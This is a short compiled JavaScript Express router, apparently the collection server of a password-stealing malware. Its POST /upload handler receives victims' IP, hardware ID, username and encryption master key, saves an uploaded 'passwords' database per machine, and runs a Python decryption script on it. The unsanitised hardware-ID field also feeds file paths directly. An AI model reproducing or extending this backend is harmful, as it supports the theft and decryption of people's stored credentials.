"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.router = void 0;
const express_1 = __importDefault(require("express"));
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const child_process_1 = __importDefault(require("child_process"));
const router = express_1.default.Router();
exports.router = router;
router.post("/upload", (req, res) => {
    const uploadData = req.body;
    const object = {
        ip: uploadData.ip,
        hwid: uploadData.hwid,
        username: uploadData.username,
        masterKey: uploadData.masterKey,
    };
    const date = new Date();
    const fileName = `${date.getMonth() + 1}-${date.getDay() + 1}-${date.getHours() + 1}`;
    if (!fs_1.default.existsSync(`./storage/${uploadData.hwid}`)) {
        fs_1.default.mkdir(`./storage/${uploadData.hwid}`, function (err) {
            if (err)
                console.log(err);
        });
    }
    fs_1.default.writeFile(`./storage/${uploadData.hwid}/passwords-${fileName}.db`, 
    // @ts-expect-error
    req.files[0].buffer, function (err) {
        if (err)
            console.log(err);
        if (!err) {
            fs_1.default.writeFile(`./storage/${uploadData.hwid}/data.json`, JSON.stringify(object), function (err) {
                if (err)
                    console.log(err);
                const spawn = child_process_1.default.spawn;
                const process = spawn("python", [
                    path_1.default.join("./decrypt.py", uploadData.hwid),
                ]);
                process.stdout.on("data", function (data) {
                    console.log(data.toString());
                });
            });
        }
    });
    res.sendStatus(200);
});
